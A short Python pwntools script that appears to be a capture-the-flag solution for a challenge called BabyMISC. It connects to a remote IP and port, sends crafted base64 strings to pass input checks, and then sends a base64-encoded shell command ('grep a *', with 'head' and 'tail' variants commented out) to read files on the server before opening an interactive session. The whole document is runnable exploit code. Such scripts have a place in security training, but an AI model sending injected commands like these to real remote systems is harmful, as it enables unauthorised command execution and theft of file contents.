#!/usr/bin/python
from pwn import *
import base64
#TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oig= -> original string

#p = process("./BabyMISC")
p = remote("110.10.212.138", 19090)

print p.recvuntil("> ")
p.sendline("TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA")
print p.recvuntil("Input 1")
p.sendline("TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oig=")
print p.recvuntil("Input 2")
p.sendline("TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oig==")
print p.recvuntil("> ")

payload = "grep a *"
#payload = "head f*"
#payload = "tail f*"


p.sendline( base64.b64encode(payload) )
p.interactive()
p.close()

